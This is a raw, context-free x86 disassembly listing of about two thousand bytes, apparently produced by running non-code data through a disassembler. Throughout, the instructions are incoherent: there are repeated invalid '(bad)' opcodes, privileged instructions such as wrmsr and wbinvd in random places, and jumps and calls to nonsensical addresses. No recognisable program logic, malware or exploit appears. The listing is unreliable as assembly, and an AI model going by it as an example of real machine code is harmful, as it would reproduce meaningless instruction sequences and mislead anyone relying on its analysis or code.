  430fa1:	data16 bnd jbe 0x431011
  430fa5:	adc    al,0x14
  430fa7:	iret   
  430fa8:	cmp    al,0x90
  430faa:	imul   BYTE PTR [eax+0x1e327aae]
  430fb0:	out    dx,al
  430fb1:	jg     0x430fa4
  430fb3:	add    eax,DWORD PTR [ebx+0x18]
  430fb6:	(bad)  
  430fb7:	(bad)  
  430fb8:	(bad)  
  430fb9:	imul   ebp,DWORD PTR [edi],0xb9483dd1
  430fbf:	in     al,dx
  430fc0:	pop    edx
	...
  431031:	add    BYTE PTR [eax],al
  431033:	add    bh,al
  431035:	ins    DWORD PTR es:[edi],dx
  431036:	aam    0xb5
  431038:	(bad)  
  431039:	mov    ebp,0xead87fe7
  43103e:	fs dec esp
  431040:	mov    cl,0x6a
  431042:	ins    BYTE PTR es:[edi],dx
  431043:	adc    DWORD PTR [eax+0x17000204],ebp
  431049:	add    BYTE PTR [eax],al
  43104b:	add    bl,dl
  43104d:	add    edi,DWORD PTR [edi+ecx*2]
  431050:	mov    al,BYTE PTR [esp+eax*2+0x2275e1b5]
  431057:	(bad)  
  431058:	xor    esi,DWORD PTR [ebp-0x6f]
  43105b:	pop    ebx
  43105c:	wbinvd 
  43105e:	adc    BYTE PTR [ecx],ah
  431060:	shl    DWORD PTR [ecx+0x3],0x0
	...
  4310b3:	add    BYTE PTR [ebp+0x55],cl
  4310b6:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  4310bc:	mov    esp,ebp
  4310be:	or     al,ah
  4310c0:	dec    ebp
  4310c1:	add    bh,al
  4310c3:	add    BYTE PTR [eax],cl
  4310c5:	add    BYTE PTR [eax],al
  4310c7:	mov    DWORD PTR [eax],0x3ef44545
  4310cd:	add    BYTE PTR ss:[ebp-0x70b6375],al
  4310d4:	retf   
  4310d5:	(bad)  
  4310d6:	enter  0x4d45,0xb8
  4310da:	mov    edi,DWORD PTR [ecx]
  4310dc:	hlt    
  4310dd:	test   ebx,ecx
  4310df:	pushf  
  4310e0:	enter  0x4df8,0x8b
  4310e4:	mov    DWORD PTR [ebp+0x8],0x894708
  4310eb:	inc    ebp
  4310ec:	mov    ebp,0xff8bfffc
  4310f1:	dec    ebp
  4310f2:	mov    ch,0xf4
  4310f4:	call   DWORD PTR [ebx-0x1]
  4310f7:	mov    ebx,0x8005122
  4310fc:	call   DWORD PTR [ecx+0x8]
  4310ff:	pop    es
  431100:	jmp    0xb8:0x9cb4533
  431107:	cdq    
  431108:	mov    esi,DWORD PTR [edx-0xc]
  43110b:	xor    al,bl
  43110d:	add    BYTE PTR [ecx+0x3c83203],bl
  431113:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431119:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43111f:	xor    eax,DWORD PTR [eax]
  431121:	retf   
  431122:	ret    
  431123:	add    eax,esi
  431125:	enter  0x8945,0x64
  431129:	dec    ebp
  43112a:	sbb    ah,cl
  43112c:	add    BYTE PTR [ebx-0xb87b277],cl
  431132:	dec    DWORD PTR [ebx-0xbcfb275]
  431138:	test   DWORD PTR [ebx],esi
  43113a:	dec    ebx
  43113c:	inc    DWORD PTR [ebx]
  43113e:	inc    eax
  43113f:	enter  0x8989,0x64
  431143:	(bad)  
  431144:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  431148:	cld    
  431149:	dec    DWORD PTR [ebp-0xa90001]
  43114f:	push   edi
  431150:	mov    BYTE PTR [edx+0x1],ch
  431153:	and    BYTE PTR [eax],al
  431155:	pop    ecx
  431156:	inc    ebp
  431157:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43115d:	push   0xffffff89
  43115f:	pop    ecx
  431160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431161:	dec    ebp
  431162:	add    BYTE PTR [ecx+0x45fc088b],cl
  431168:	jne    0x4311b2
  43116a:	lea    eax,[eax]
  43116c:	fs (bad) 
  43116e:	dec    DWORD PTR [eax]
  431170:	mov    DWORD PTR [eax],eax
  431172:	test   al,0x0
  431174:	add    BYTE PTR [ebp-0x18],cl
  431177:	xor    ebp,DWORD PTR [edx]
  431179:	add    eax,DWORD PTR [eax]
  43117b:	mov    eax,eax
  43117d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431184:	inc    ebp
  431185:	mov    DWORD PTR [ebx+0x459408],ecx
  43118b:	popa   
  43118c:	mov    esp,DWORD PTR [ebp-0x75]
  43118f:	(bad)  
  431190:	cld    
  431191:	inc    eax
  431192:	cmp    bh,0x1
  431195:	lea    eax,[eax]
  431197:	and    BYTE PTR [eax],al
  431199:	inc    DWORD PTR [ecx-0x18]
  43119c:	mov    ecx,DWORD PTR [ebx]
  43119e:	cld    
  43119f:	add    BYTE PTR [ecx+0x75014d],cl
  4311a5:	(bad)  
  4311a6:	xchg   ebp,eax
  4311a7:	sar    bh,1
  4311a9:	inc    eax
  4311aa:	inc    DWORD PTR [eax]
  4311ac:	mov    eax,DWORD PTR [ebp-0x4]
  4311af:	xor    edx,DWORD PTR [edx+0x7201be]
  4311b5:	add    BYTE PTR [edx],dl
  4311b7:	(bad)  
  4311b8:	nop
  4311b9:	inc    ebp
  4311ba:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4311c0:	mov    al,0xff
  4311c2:	add    bh,bh
  4311c4:	add    BYTE PTR [ebx],dh
  4311c6:	inc    DWORD PTR [ebx]
  4311c8:	sbb    al,0x89
  4311ca:	jne    0x4311a8
  4311cc:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4311d2:	mov    eax,DWORD PTR [ebp-0xff0048]
  4311d8:	mov    DWORD PTR [eax-0x70],0xe870e989
  4311df:	inc    DWORD PTR [ebp-0x75]
  4311e2:	(bad)  [esi+ebp*8]
  4311e5:	test   DWORD PTR [esi-0x1],esp
  4311e8:	inc    ebp
  4311e9:	(bad)  
  4311ea:	aas    
  4311eb:	inc    ebp
  4311ec:	(bad)  
  4311ed:	lea    edi,[eax+edi*2-0x1]
  4311f1:	inc    edi
  4311f3:	mov    DWORD PTR [ecx],edi
  4311f5:	mov    al,ds:0x8b8000c7
  4311fa:	call   0x45d0f4fb
  4311ff:	(bad)  
  431200:	out    dx,al
  431201:	(bad)  
  431202:	fisttp WORD PTR [eax+0x8801c7]
  431208:	jecxz  0x43124f
  43120a:	call   0xe83f580e
  43120f:	lea    edi,[edi]
  431211:	(bad)  
  431212:	call   0xcb3d16
  431217:	add    DWORD PTR [ebx-0x7f570400],ecx
  43121d:	add    BYTE PTR [ecx],al
  43121f:	test   DWORD PTR [eax],eax
  431221:	wrmsr  
  431223:	jae    0x431212
  431225:	add    BYTE PTR [eax],al
  431227:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43122d:	add    esp,edi
  43122f:	add    BYTE PTR [eax+0x450108],al
  431235:	mov    edi,DWORD PTR [ebp-0x6c]
  431238:	add    DWORD PTR [eax],0x4
  43123b:	mov    eax,DWORD PTR [ebp+0x3]
  43123e:	mov    edi,DWORD PTR [esp+edi*8]
  431241:	dec    ebp
  431242:	nop
  431243:	mov    eax,DWORD PTR [ecx]
  431245:	fadd   DWORD PTR [eax]
  431247:	add    BYTE PTR [esi],al
  431249:	lea    eax,[eax]
  43124b:	pusha  
  43124c:	push   eax
  43124d:	inc    DWORD PTR [ebp+0x52]
  431250:	call   DWORD PTR [ebp-0x7b]
  431253:	mov    esi,DWORD PTR [ebp-0x74]
  431256:	mov    eax,DWORD PTR [eax]
  431258:	cld    
  431259:	mov    eax,DWORD PTR [eax+0x880103]
  43125f:	add    BYTE PTR [ebp+0x6a],bh
  431262:	cmp    edi,0x10
  431265:	mov    WORD PTR [ebp+0x0],es
  431268:	mov    edx,DWORD PTR [edx-0x4]
  43126b:	push   ecx
  43126c:	nop
  43126d:	inc    DWORD PTR [ecx]
  43126f:	cld    
  431270:	add    BYTE PTR [ebp-0x24],bh
  431273:	mov    eax,DWORD PTR [eax]
  431275:	cld    
  431276:	push   eax
  431277:	nop
  431278:	inc    ebp
  431279:	add    edi,edi
  43127b:	add    BYTE PTR [ebx+0x4de2f445],cl
  431281:	jmp    0xe33b:0x9403c733
  431288:	movntq QWORD PTR [esi],mm6
  43128b:	mov    DWORD PTR [eax],0xb87e8b98
  431291:	test   ebx,eax
  431293:	jmp    DWORD PTR [edi-0x1]
  431296:	int    0xe9
  431298:	sub    esp,esi
  43129a:	add    eax,DWORD PTR [ebp-0x30]
  43129d:	fild   WORD PTR [ebp+0x3f]
  4312a0:	cmp    eax,edi
  4312a2:	je     0xcc43f8c4
  4312a8:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4312af:	(bad)  
  4312b0:	jne    0x43123e
  4312b2:	mov    ebx,ecx
  4312b4:	cld    
  4312b5:	jle    0x4312fc
  4312b7:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  4312bd:	inc    ebp
  4312be:	call   0xeb3c4e
  4312c3:	add    BYTE PTR [ebx-0x7f170301],cl
  4312c9:	add    DWORD PTR es:[eax],eax
  4312cc:	add    al,al
  4312ce:	xor    BYTE PTR [eax+0x41],dl
  4312d1:	inc    ebp
  4312d2:	add    BYTE PTR [ebx+0xfcd88b],cl
  4312d8:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  4312de:	add    DWORD PTR [ecx+0x458be845],ecx
  4312e4:	fmul   DWORD PTR [ebx+0x8bb800]
  4312ea:	cld    
  4312eb:	call   0xd83db0
  4312f0:	dec    DWORD PTR [ebx+0x1090e8ff]
  4312f6:	add    al,al
  4312f8:	push   eax
  4312f9:	es inc ebp
  4312fb:	inc    ebp
  4312fc:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431302:	dec    DWORD PTR [ebx-0x3ff70301]
  431308:	mov    DWORD PTR gs:[eax],eax
  43130b:	call   0x8b6b58d0
  431310:	inc    ebp
  431311:	mov    eax,0xe8d8008b
  431316:	add    BYTE PTR [ecx],ch
  431318:	mov    eax,DWORD PTR [eax]
  43131a:	cld    
  43131b:	mov    eax,eax
  43131d:	call   0x462b2377
  431322:	sub    DWORD PTR [ebx-0x3c743000],ecx
  431328:	cld    
  431329:	mov    BYTE PTR [eax+0x8401c1],0x1
  431330:	xor    BYTE PTR [eax],al
  431332:	push   edi
  431333:	inc    ebp
  431334:	mov    DWORD PTR [ebx],esi
  431336:	in     al,0xb9
  431338:	inc    ebp
  431339:	lea    ecx,[ebx-0x3c370301]
  43133f:	dec    ebp
  431340:	cdq    
  431341:	mov    esi,DWORD PTR [edx]
  431343:	or     BYTE PTR [ebx],al
  431345:	ror    DWORD PTR [ebp-0xfebf79],0x0
  43134c:	call   0x433c96
  431351:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  431357:	jge    0x43138c
  431359:	mov    eax,DWORD PTR [ebx]
  43135b:	cld    
  43135c:	lea    edx,[eax+0xff0120]
  431362:	call   0x433cf6
  431367:	push   eax
  431368:	inc    DWORD PTR [ebp-0x1c]
  43136b:	mov    ecx,DWORD PTR [ebp-0x58]
  43136e:	xor    eax,DWORD PTR [eax]
  431370:	add    edi,edi
  431372:	cmp    ebp,eax
  431374:	jne    0x43139c
  431376:	mov    DWORD PTR [eax],0x8b004dd8
  43137c:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431383:	mov    eax,ebx
  431385:	cld    
  431386:	test   BYTE PTR [eax+0x320199],bh
  43138c:	mov    DWORD PTR [ebp+0x8],esi
  43138f:	xor    eax,DWORD PTR [ebp-0x73]
  431392:	test   DWORD PTR [esp+esi*2-0x1],edi
  431396:	mov    ebp,eax
  431398:	mov    eax,0x33004d29
  43139d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  4313a3:	add    DWORD PTR [eax],eax
  4313a5:	add    BYTE PTR [ebp+0x30],al
  4313a8:	mov    edx,DWORD PTR [edi-0x48]
  4313ab:	add    ebx,0xffffffe4
  4313ae:	addr16 test ebp,ecx
  4313b1:	je     0x4313de
  4313b3:	mov    eax,DWORD PTR [ebx]
  4313b5:	cld    
  4313b6:	sar    BYTE PTR [eax+0x3b0145],1
  4313bc:	pcmpeqw mm4,mm6
  4313bf:	xor    edi,edi
  4313c1:	lea    ecx,[ebx-0x239c7470]
  4313c7:	add    BYTE PTR [ebp+0x50],cl
  4313ca:	cmp    eax,DWORD PTR [ebp+0x75]
  4313cd:	mov    ebp,DWORD PTR [eax-0x68]
  4313d0:	test   DWORD PTR [eax],eax
  4313d2:	clc    
  4313d3:	push   DWORD PTR [ebp-0x1]
  4313d6:	lea    ecx,[eax]
  4313d8:	int3   
  4313d9:	inc    ebp
  4313da:	call   0xfb446a
  4313df:	jne    0x4313d9
  4313e1:	xor    edi,DWORD PTR [ebp-0x41]
  4313e4:	jmp    0x431458
  4313e6:	mov    eax,DWORD PTR [eax]
  4313e8:	mov    eax,0x339545c7
  4313ed:	inc    DWORD PTR [ebx]
  4313ef:	push   DWORD PTR [ecx]
  4313f1:	aaa    
  4313f2:	mov    eax,DWORD PTR [eax]
  4313f4:	jmp    0x431446
  4313f6:	mov    eax,DWORD PTR [ebp-0x3c]
  4313f9:	mov    eax,eax
  4313fb:	cld    
  4313fc:	clc    
  4313fd:	ret    
  4313fe:	test   bh,al
  431400:	pop    es
  431401:	xchg   ebp,eax
  431402:	add    bh,bh
  431404:	inc    ebp
  431405:	dec    DWORD PTR [edi]
  431407:	and    DWORD PTR [ebx],ebp
  431409:	add    BYTE PTR [eax],al
  43140b:	push   eax
  43140c:	jbe    0x431463
  43140e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431414:	or     al,0xcf
  431416:	inc    eax
  431417:	enter  0x745,0x72
  43141b:	inc    ebp
  43141c:	mov    eax,DWORD PTR [ecx]
  43141e:	int3   
  43141f:	add    BYTE PTR [ebp-0x75],al
  431422:	ss mov eax,0x33c74d9c
  431428:	ror    BYTE PTR [ebp+0x72f80885],1
  43142e:	inc    ebp
  43142f:	add    BYTE PTR [ebx-0x3c7423bb],cl
  431435:	fadd   st,st(6)
  431437:	rol    BYTE PTR [ebp+0x12],0x8b
  43143b:	inc    ebp
  43143c:	fmul   QWORD PTR [ebx-0x3c39233d]
  431442:	inc    ebp
  431443:	test   bh,al
  431445:	cdq    
  431446:	clc    
  431447:	xor    al,BYTE PTR [ebp+0x45dcf889]
  43144d:	inc    ebp
  43144e:	cmp    BYTE PTR [ebx],dh
  431450:	pushf  
  431451:	mov    ecx,0xffb48dc7
  431456:	test   eax,ecx
  431458:	clc    
  431459:	dec    ebp
  43145a:	inc    ebp
  43145b:	mov    edi,DWORD PTR [edx]
  43145d:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  431464:	test   edi,edi
  431466:	clc    
  431467:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  43146e:	(bad)  
  43146f:	enter  0x18e8,0x85
  431473:	ss clc 
  431475:	pushf  
  431476:	inc    ebp
  431477:	dec    DWORD PTR [ebx-0x3cba0f04]
  43147d:	push   eax
  43147e:	xabort 0x7d
  431481:	add    BYTE PTR [ebx],bh
  431483:	mov    ecx,DWORD PTR [edi]
  431485:	mov    DWORD PTR [eax],ebx
  431487:	les    eax,FWORD PTR [eax]
  431489:	adc    ebp,ecx
  43148b:	dec    ebp
  43148c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431492:	mov    ecx,esi
  431494:	lock or al,cl
  431497:	clc    
  431498:	inc    ebp
  431499:	add    esi,DWORD PTR [ebx]
  43149b:	jge    0x4314a0
  43149d:	xor    edi,DWORD PTR [ebx]
  43149f:	cmp    ecx,DWORD PTR [edi]
  4314a1:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4314a6:	mov    edi,DWORD PTR [ecx]
  4314a8:	test   al,0xcc
  4314aa:	dec    ebp
  4314ab:	test   BYTE PTR [ebx],dh
  4314ad:	pop    es
  4314ae:	xor    eax,DWORD PTR [eax]
  4314b0:	add    ecx,DWORD PTR [esi]
  4314b2:	add    ecx,eax
  4314b4:	psraw  mm0,mm1
  4314b7:	sub    BYTE PTR [ebp+0x38],cl
  4314ba:	mov    edi,DWORD PTR [ebx]
  4314bc:	lock int3 
  4314be:	shl    edx,1
  4314c0:	rol    BYTE PTR [ebp+0xc],1
  4314c3:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4314ca:	jmp    0x7c1514
  4314cf:	pushf  
  4314d0:	inc    ebp
  4314d1:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4314d7:	xor    ecx,ebx
  4314d9:	add    ecx,esi
  4314db:	mov    esi,eax
  4314dd:	enter  0x45af,0x8b
  4314e1:	xor    ecx,eax
  4314e3:	add    edx,DWORD PTR [ebp-0x77]
  4314e6:	sub    ecx,DWORD PTR [eax]
  4314e8:	cmp    eax,DWORD PTR [ebp+0x77]
  4314eb:	(bad)  
  4314ec:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  4314f3:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4314f9:	cmp    esi,DWORD PTR [ebx]
  4314fb:	pushf  
  4314fc:	xor    eax,edi
  4314fe:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431505:	inc    ebp
  431506:	dec    ebp
  431507:	cmp    eax,0xc7f09c8b
  43150c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431513:	inc    ebp
  431514:	jmp    0x431555
  431516:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43151d:	dec    ebp
  43151e:	xor    esi,DWORD PTR [ebx]
  431520:	add    eax,DWORD PTR [ebx]
  431522:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  431528:	dec    ebp
  431529:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  43152f:	out    dx,eax
  431530:	rol    BYTE PTR [eax],1
  431532:	add    eax,0xebc8458b
  431537:	dec    ebp
  431538:	mov    ebp,DWORD PTR [ebx]
  43153a:	mov    esp,0x33f84d8b
  43153f:	ret    
  431540:	xor    eax,esi
  431542:	add    ecx,eax
  431544:	add    eax,DWORD PTR [edx+0xc1010f]
  43154a:	dec    ebp
  43154b:	inc    ebp
  43154c:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  431552:	ror    bl,1
  431554:	add    eax,0xebc645ce
  431559:	scas   eax,DWORD PTR es:[edi]
  43155a:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  431560:	xor    ebp,DWORD PTR [ebx]
  431562:	xor    edi,DWORD PTR [ebx]
  431564:	add    esi,DWORD PTR [edi+0x3]
  431567:	mov    ecx,DWORD PTR [edi]
  431569:	clc    
  43156a:	rol    ebx,0x4d
  43156d:	(bad)  
  43156e:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  431575:	mov    ah,0x45
  431577:	dec    ebp
  431578:	jbe    0x4315ad
  43157a:	mov    esi,DWORD PTR [ebx]
  43157c:	call   0x33466284
  431581:	rdpmc  
  431583:	rol    DWORD PTR [ebx],0x4d
  431586:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43158c:	inc    ebp
  43158d:	ror    BYTE PTR [ebx+0x45450808],1
  431593:	jmp    0x10b1623
  431598:	inc    ebp
  431599:	inc    ebp
  43159a:	(bad)  
  43159b:	mov    ebx,eax
  43159d:	clc    
  43159e:	test   ebx,eax
  4315a0:	clc    
  4315a1:	retf   
  4315a2:	inc    ebp
  4315a3:	into   
  4315a4:	mov    esi,0x8b85afec
  4315aa:	clc    
  4315ab:	enter  0x5545,0x38
  4315af:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4315b6:	ret    
  4315b7:	mov    ah,0xc6
  4315b9:	addr16 push 0x338b4545
  4315bf:	clc    
  4315c0:	add    eax,ebx
  4315c2:	loopne 0x43158f
  4315c4:	dec    ebp
  4315c5:	into   
  4315c6:	mov    al,dh
  4315c8:	or     BYTE PTR [edi-0x37ff748e],ch
  4315ce:	inc    ebp
  4315cf:	push   ebp
  4315d0:	mov    ebp,DWORD PTR [ebx]
  4315d2:	in     al,dx
  4315d3:	cmp    eax,ebx
  4315d5:	ja     0x43161c
  4315d7:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4315dd:	inc    ebp
  4315de:	cdq    
  4315df:	mov    esi,DWORD PTR [edx]
  4315e1:	clc    
  4315e2:	mov    bl,al
  4315e4:	xlat   BYTE PTR ds:[ebx]
  4315e5:	retf   
  4315e6:	inc    ebp
  4315e7:	into   
  4315e8:	mov    eax,esi
  4315ea:	in     al,dx
  4315eb:	scas   eax,DWORD PTR es:[edi]
  4315ec:	retf   
  4315ed:	mov    ecx,DWORD PTR [ebp-0x38]
  4315f0:	mov    edx,DWORD PTR [ebp-0x24]
  4315f3:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  4315fa:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431601:	mov    eax,DWORD PTR [ebx]
  431603:	clc    
  431604:	loopne 0x4315c9
  431606:	push   ebp
  431607:	retf   
  431608:	mov    dh,al
  43160a:	adc    esi,ecx
  43160c:	jb     0x4315bd
  43160e:	add    BYTE PTR [ebx+0x558bc845],cl
  431614:	in     al,dx
  431615:	sub    eax,ebx
  431617:	cmp    ecx,ebx
  431619:	mov    eax,esi
  43161b:	mov    esp,0x45af03ce
  431620:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  431626:	mov    eax,ebx
  431628:	in     al,dx
  431629:	into   
  43162a:	dec    ebp
  43162b:	(bad)  
  43162c:	xor    ebp,DWORD PTR [edi+0x80f8903]
  431632:	rol    DWORD PTR [ebp+0x4d],0x89
  431636:	xor    esp,esp
  431638:	sub    eax,DWORD PTR [ebp-0x75]
  43163b:	add    ebp,esp
  43163d:	mov    al,0x55
  43163f:	inc    ebp
  431640:	xor    esi,DWORD PTR [esi]
  431642:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  431649:	inc    ebp
  43164a:	xor    edi,DWORD PTR [ecx]
  43164c:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  431653:	test   DWORD PTR [eax],eax
  431655:	clc    
  431656:	enter  0x8645,0x33
  43165a:	inc    DWORD PTR [ebx]
  43165c:	(bad)  
  43165d:	jmp    0x4316a4
  43165f:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  431665:	inc    ebp
  431666:	(bad)  
  431667:	mov    ebp,DWORD PTR [edi-0x277b7424]
  43166d:	cdq    
  43166e:	retf   
  43166f:	xor    al,cl
  431671:	mov    BYTE PTR [ebp+0xb],cl
  431674:	lea    eax,[ebp+0x8]
  431677:	xor    esi,DWORD PTR [edx+0x3]
  43167a:	add    al,ah
  43167c:	inc    ebp
  43167d:	dec    ebp
  43167e:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431684:	addr16 add ch,cl
  431687:	inc    ebp
  431688:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43168e:	inc    ebp
  43168f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431695:	push   ebp
  431696:	(bad)  
  431697:	mov    BYTE PTR [edi+0xf723b11],ch
  43169d:	add    ch,ch
  43169f:	inc    ebp
  4316a0:	dec    DWORD PTR [ebx-0x34332775]
  4316a6:	add    al,0x4d
  4316a8:	inc    ebp
  4316a9:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4316af:	cdq    
  4316b0:	add    DWORD PTR [edx],esi
  4316b2:	add    BYTE PTR [ebx+0x4d00c000],cl
  4316b8:	push   DWORD PTR [ebx]
  4316ba:	int3   
  4316bb:	xor    eax,DWORD PTR [eax]
  4316bd:	add    edx,DWORD PTR [eax+0x3]
  4316c0:	mov    DWORD PTR [edi],ecx
  4316c2:	call   0x4288d788
  4316c7:	mov    DWORD PTR [ebp-0x20],esp
  4316ca:	add    BYTE PTR [ebp+0x7d],al
  4316cd:	mov    eax,DWORD PTR [eax]
  4316cf:	in     al,0x15
  4316d1:	ret    
  4316d2:	iret   
  4316d3:	(bad)  
  4316d4:	enter  0x14af,0x8b
  4316d8:	(bad)  
  4316d9:	in     al,dx
  4316da:	or     bl,cl
  4316dc:	adc    cl,al
  4316de:	push   ebp
  4316df:	dec    ebp
  4316e0:	inc    eax
  4316e1:	mov    edx,DWORD PTR [ebp-0x20]
  4316e4:	jb     0x4316b1
  4316e6:	mov    ecx,esi
  4316e8:	cld    
  4316e9:	scas   eax,DWORD PTR es:[edi]
  4316ea:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4316f1:	mov    BYTE PTR [eax],0x8c
  4316f4:	push   0xffffff99
  4316f6:	push   edi
  4316f7:	xor    dl,BYTE PTR [eax+0x3b]
  4316fa:	mov    ecx,DWORD PTR [edi]
  4316fc:	call   0x8c425c5f
  431701:	mov    eax,eax
  431703:	in     al,dx
  431704:	jge    0x431753
  431706:	mov    DWORD PTR [ebx],esi
  431708:	int3   
  431709:	add    eax,DWORD PTR [ebp+0xf]
  43170c:	xor    eax,ecx
  43170e:	(bad)  
  43170f:	dec    ebp
  431710:	pushf  
  431711:	xor    ecx,esi
  431713:	add    edi,DWORD PTR [edi]
  431715:	mov    eax,DWORD PTR [ebp-0x38]
  431718:	(bad)  
  431719:	test   dh,dl
  43171b:	cdq    
  43171c:	add    esi,DWORD PTR [edx]
  43171e:	jmp    0x4316a9
  431720:	mov    cl,al
  431722:	add    eax,0x14330f45
  431727:	mov    ecx,0xff448d80
  43172c:	jmp    0xc99026f9
  431731:	mov    edx,ecx
  431733:	rol    BYTE PTR [ebp+0x330155],1
  431739:	add    ecx,DWORD PTR [ebp+0xf]
  43173c:	xor    eax,edx
  43173e:	(bad)  
  43173f:	ror    DWORD PTR [eax],0x86
  431742:	jb     0x431741
  431744:	add    bh,bh
  431746:	clc    
  431747:	inc    ebp
  431748:	jb     0x4317b4
  43174a:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  431750:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  431758:	ret    
  431759:	xor    al,bh
  43175b:	add    BYTE PTR [ebp+0x75],al
  43175e:	ss push 0xffffff9c
  431761:	inc    edi
  431763:	adc    al,0xe8
  431765:	inc    ebp
  431766:	test   DWORD PTR [ebp-0x7cba8b08],eax
  43176c:	mov    ecx,DWORD PTR [eax]
  43176e:	cld    
  43176f:	or     DWORD PTR [ebp-0x34],0x33
  431773:	jbe    0x431778
  431775:	mov    edx,DWORD PTR [ecx+0x2b]
  431778:	dec    ebp
  431779:	mov    cl,BYTE PTR [ebx+0x45d801]
  43177f:	mov    BYTE PTR [ebx],dh
  431781:	mov    eax,DWORD PTR [ebx]
  431783:	or     BYTE PTR [ecx+0x3b],dl
  431786:	dec    ebp
  431787:	int3   
  431788:	xor    ebp,edi
  43178a:	add    eax,DWORD PTR [ebp+0x51]
  43178d:	mov    ecx,DWORD PTR [ebp-0x28]
  431790:	xor    eax,DWORD PTR [eax]
  431792:	add    ebp,DWORD PTR [eax+0x51]
  431795:	adc    BYTE PTR [eax+0x0],0x8b
  431799:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43179f:	inc    ebp
  4317a0:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4317a6:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4317ac:	dec    ebp
  4317ad:	mov    esi,DWORD PTR [ebx]
  4317af:	hlt    
  4317b0:	add    eax,ebx
  4317b2:	push   ecx
  4317b3:	inc    ebp
  4317b4:	dec    ebp
  4317b5:	(bad)  
  4317b6:	call   esi
  4317b8:	in     al,0xc7
  4317ba:	retf   
  4317bb:	mov    al,ds:0xc1ff39ce
  4317c0:	adc    al,0xc6
  4317c2:	inc    ebp
  4317c3:	and    eax,0x9c0f4c85
  4317c8:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4317cf:	cmp    BYTE PTR [ebx+0x3a],0x0
  4317d3:	mov    dh,0xc7
  4317d5:	cmp    eax,eax
  4317d7:	jne    0x45441023
  4317dd:	mov    edi,DWORD PTR [eax]
  4317df:	mov    eax,0x848bcb9c
  4317e4:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  4317eb:	or     BYTE PTR [edi],cl
  4317ed:	(bad)  
  4317ee:	dec    ebp
  4317ef:	inc    edi
  4317f0:	add    bh,0x51
  4317f3:	or     cl,ch
  4317f5:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4317fb:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431801:	mov    esp,0xf802b588
  431806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431807:	inc    ebp
  431808:	(bad)  
  431809:	cmp    bh,bh
  43180b:	pushf  
  43180c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431813:	mov    ecx,DWORD PTR [ebp-0x340018]
  431819:	into   
  43181a:	dec    DWORD PTR [ebx-0x7f72431c]
  431820:	push   0x5000ff01
  431825:	retf   
  431826:	inc    ebp
  431827:	into   
  431828:	dec    DWORD PTR [ebx-0x343f3ff4]
  43182e:	push   eax
  43182f:	into   
  431830:	call   0x4b1cc0
  431835:	retf   
  431836:	add    dh,cl
  431838:	add    bh,bh
  43183a:	mov    DWORD PTR [eax+ecx*1],edx
  43183d:	clc    
  43183e:	inc    ebp
  43183f:	inc    ebp
  431840:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  431846:	push   0x1
  431848:	push   edi
  431849:	add    BYTE PTR [eax-0x35],dl
  43184c:	mov    ecx,esi
  43184e:	cld    
  43184f:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  431855:	into   
  431856:	ror    BYTE PTR [ebx+0x75000800],0x50
  43185d:	xor    eax,DWORD PTR [ebp+0x3]
  431860:	jne    0x4318b3
  431862:	call   DWORD PTR [eax-0x3c]
  431865:	mov    DWORD PTR [ecx-0x18],edx
  431868:	mov    edi,edi
  43186a:	call   0x8b465df3
  43186f:	add    ah,ah
